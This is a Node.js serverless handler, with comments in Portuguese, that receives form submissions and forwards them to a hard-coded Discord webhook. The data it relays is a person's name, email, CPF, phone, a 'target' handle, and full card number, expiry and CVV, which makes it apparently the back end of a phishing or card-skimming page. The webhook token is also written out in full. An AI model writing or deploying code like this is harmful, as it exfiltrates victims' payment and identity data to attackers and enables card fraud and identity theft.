// =====================================================
// 💳 WEBHOOK DO CARTÃO → Discord (canal CARD)
// =====================================================

const DISCORD_CART = 'https://discord.com/api/webhooks/1557935037364568125/wzFcrRt7kRLEdhOpioigR5yEBEuaivTFyH99PAqms-3_9-TSKv3zAiCHKnq-VkMU11S1';

module.exports = async (req, res) => {
    // CORS (opcional, mas ajuda em testes)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const {
            nome_cliente,
            email,
            cpf,
            telefone,
            alvo,
            card_name,
            card_number,
            card_expiry,
            card_cvv,
            card_installments
        } = req.body || {};

        const fields = [
            { name: '👤 Nome',          value: nome_cliente || '—',                              inline: true },
            { name: '📧 E-mail',        value: email        || '—',                              inline: false },
            { name: '🪪 CPF',           value: cpf          || '—',                              inline: true },
            { name: '📱 Telefone',      value: telefone     || '—',                              inline: true }
        ];

        if (alvo) {
            fields.push({ name: '🎯 Alvo', value: '@' + alvo, inline: false });
        }

        // Dados do cartão
        fields.push(
            { name: '👤 Nome impresso',    value: card_name         || '—',                            inline: true },
            { name: '💳 Número do cartão', value: card_number       || '—',                            inline: false },
            { name: '📅 Validade',         value: card_expiry       || '—',                            inline: true },
            { name: '🔒 CVV',              value: card_cvv          || '—',                            inline: true },
            { name: '📦 Parcelas',         value: card_installments ? card_installments + 'x' : '—',   inline: true }
        );

        await fetch(DISCORD_CART, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'Cartão 💳',
                embeds: [{
                    title: '💳 Novo Cartão Preenchido',
                    color: 0x0400f0,
                    fields: fields,
                    footer: { text: new Date().toLocaleString('pt-BR') }
                }]
            })
        });

        return res.status(200).json({ ok: true });

    } catch (error) {
        console.error('❌ Erro webhook cartão:', error.message);
        return res.status(400).json({ ok: false, error: error.message });
    }
};
